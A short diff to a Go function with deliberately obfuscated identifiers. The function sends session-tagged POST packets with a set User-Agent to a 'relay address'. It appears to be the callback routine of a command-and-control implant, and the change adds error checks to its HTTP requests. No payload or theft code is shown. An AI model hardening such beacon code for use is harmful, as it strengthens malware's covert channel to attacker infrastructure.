@@ -67,18 +67,22 @@ func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_r
 		obf_var_client := &http.Client{}
 		obf_var_res, _ := obf_var_client.Do(obf_var_req)
 		defer obf_var_res.Body.Close()
-		obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
-		obf_var_return = string(obf_var_body)
+		obf_var_body, obf_var_e := ioutil.ReadAll(obf_var_res.Body)
+		if obf_var_e == nil {
+			obf_var_return = string(obf_var_body)
+		}
 	} else if obf_var_request_type == obf_const_get_tag {
 		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
 		obf_var_packet := strings.Join(obf_var_a, "\n")
 		obf_var_req, _ := http.NewRequest( "POST", obf_var_relay_address, strings.NewReader(obf_var_packet) )
 		obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
 		obf_var_client := &http.Client{}
-		obf_var_res, _ := obf_var_client.Do(obf_var_req)
-		defer obf_var_res.Body.Close()
-		obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
-		obf_var_return = string(obf_var_body)
+		obf_var_res, obf_var_e := obf_var_client.Do(obf_var_req)
+		if obf_var_e == nil {
+			defer obf_var_res.Body.Close()
+			obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
+			obf_var_return = string(obf_var_body)
+		}
 	}
 	return obf_var_return
 }
